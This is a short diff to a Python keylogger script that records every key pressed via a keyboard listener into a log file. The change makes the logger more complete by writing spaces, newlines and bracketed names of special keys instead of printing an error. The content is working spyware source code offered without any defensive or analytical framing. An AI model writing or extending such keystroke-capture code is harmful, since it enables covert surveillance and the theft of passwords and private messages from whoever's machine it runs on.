@@ -7,7 +7,13 @@ def keyPressed(key):
             char=key.char
             logKey.write(char)
         except:
-            print("error in getting the key")
+            if key== keyboard.Key.space:
+                logKey.write(' ')# for space
+            elif key==keyboard.Key.enter:
+                logKey.write('\n')#new line
+            else:
+                logKey.write(f'[{key}]')#special
+           # print("error in getting the key")
 
 if __name__=="__main__":
     listener = keyboard.Listener(on_press=keyPressed)
